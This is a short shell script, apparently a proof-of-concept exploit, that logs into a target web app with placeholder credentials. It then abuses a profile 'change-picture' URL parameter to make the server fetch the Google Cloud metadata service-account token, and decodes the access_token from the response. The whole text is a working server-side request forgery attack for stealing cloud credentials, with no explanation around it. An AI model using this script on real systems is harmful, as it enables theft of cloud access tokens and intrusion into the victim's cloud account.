curl -s "$1/api/login" \
    -c /tmp/cookies \
    -X POST \
    -d "username=foo&password=bar" \
    -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

curl -s "$1/api/profile/change-picture?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -b /tmp/cookies \
    -X PATCH |
    cut -d "," -f2 |
    base64 -d |
    jq -r '.access_token'